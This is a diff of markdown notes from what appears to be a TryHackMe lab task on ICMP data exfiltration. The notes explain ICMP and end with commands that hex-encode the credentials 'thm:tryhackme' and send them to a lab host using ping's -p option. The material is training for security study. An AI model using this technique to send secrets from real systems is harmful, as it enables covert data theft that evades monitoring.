@@ -2,10 +2,11 @@
 
 In this task, we will be showing how to exfiltrate data using the ICMP protocol. ICMP stands for **I**nternet **C**ontrol **M**essage **P**rotocol, and it is a network layer protocol used to handle error reporting. If you need more information about ICMP and the fundamentals of computer networking, you may visit the following THM room: [What is Networking](https://tryhackme.com/room/whatisnetworking) https://tryhackme.com/room/whatisnetworking. 
 
-Network devices such as routers use **`ICMP`** to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the **`ping`** command to send **`ICMP`** packets through the network, as shown in the following figure.
+Network devices such as routers use **`ICMP`** to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the **`ping`** command to send **`ICMP`** packets through the network, as shown in the figure below:
 
 ![image](https://github.com/user-attachments/assets/a4cbaf82-22f5-42df-aa28-3b03d4666d31)<br>
-###### ICMP Request and Reply <br>
+<br>
+#### ICMP Request and Reply <br>
 
 The **`HOST1`** sends an ICMP packet with an **echo-request** packet. Then, if **`HOST2`** is available, it sends an **`ICMP`** packet back with an **echo reply** message confirming the availability.
 
@@ -13,30 +14,35 @@ The **`HOST1`** sends an ICMP packet with an **echo-request** packet. Then, if *
 
 On a high level, the **`ICMP`** packet's structure contains a **`Data`** section that can include strings or copies of other information, such as the IPv4 header, used for error messages. The following diagram shows the **`Data`** section, which is optional to use.<br>
 ![image](https://github.com/user-attachments/assets/4f8bf4a9-c0e7-4af1-83c1-50c60fa45e30)<br>
-ICMP Packet Structure
+###### ICMP Packet Structure
 <br>
+<br>
+
 Note that the Data field is optional and could either be empty or it could contain a random string during the communications. As an attacker, we can use the ICMP structure to include our data within the **`Data`** section and send it via **`ICMP`** packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.
 
 To perform manual ICMP data exfiltration, we need to discuss the **`ping`** command a bit more. The **`ping`** command is a network administrator software available in any operating system. It is used to check the reachability and availability by sending **`ICMP`** packets, which can be used as follows:
 <br>
 ###### Sending one ICMP packet using the PING Command:<br>
 ```thm@AttackBox$ ping 10.10.144.103 -c 1```<br>
-    We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the **`-c 1`** argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like.
-
-Showing the Data Field value in Wireshark
-
+<br>
+We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the **`-c 1`** argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like.
+<br>
+![image](https://github.com/user-attachments/assets/f858202c-bfcd-4c98-a455-66006c8f6d7d)
+###### Showing the Data Field value in Wireshark
+<br><br>
 The Wireshark screenshot shows that the Data section has been selected with random strings. It is important to note that this section could be filled with the data that needs to be transferred to another machine. 
 
-The ping command in the Linux OS has an interesting ICMP option. With the -p argument, we can specify 16 bytes of data in hex representation to send through the packet. Note that the -p option is only available for Linux operating systems. We can confirm that by checking the ping's help manual page.
+The ping command in the Linux OS has an interesting ICMP option. With the -p argument, we can specify 16 bytes of data in hex representation to send through the packet. #####**Note that the **`-p`** option is only available for Linux operating systems**#####. We can confirm that by checking the ping's help manual page.
+<br><br>
+![image](https://github.com/user-attachments/assets/21cd4be2-a81f-4793-b0f9-13489c271214)
+###### Ping's -p argument
 
-Ping's -p argument
+Let's say that we need to exfiltrate the following credentials **`thm:tryhackme`**. First, we need to convert it to its Hex representation and then pass it to the **`ping`** command using **`-p`** options as follows,
 
-Let's say that we need to exfiltrate the following credentials thm:tryhackme. First, we need to convert it to its Hex representation and then pass it to the ping command using -p options as follows,
-
-Using the xxd command to convert text to Hex
-root@AttackBox$ echo "thm:tryhackme" | xxd -p 
-74686d3a7472796861636b6d650a
-We used the xxd command to convert our string to Hex, and then we can use the ping command with the Hex value we got from converting the thm:tryhackme.
+##### Using the xxd command to convert text to Hex:
+```root@AttackBox$ echo "thm:tryhackme" | xxd -p 74686d3a7472796861636b6d650a```
+<br>
+We used the **`xxd`** command to convert our string to Hex, and then we can use the **`ping`** command with the Hex value we got from converting the **`thm:tryhackme`**.
 
 Send Hex using the ping command.
 root@AttackBox$ ping 10.10.144.103 -c 1 -p 74686d3a7472796861636b6d650a
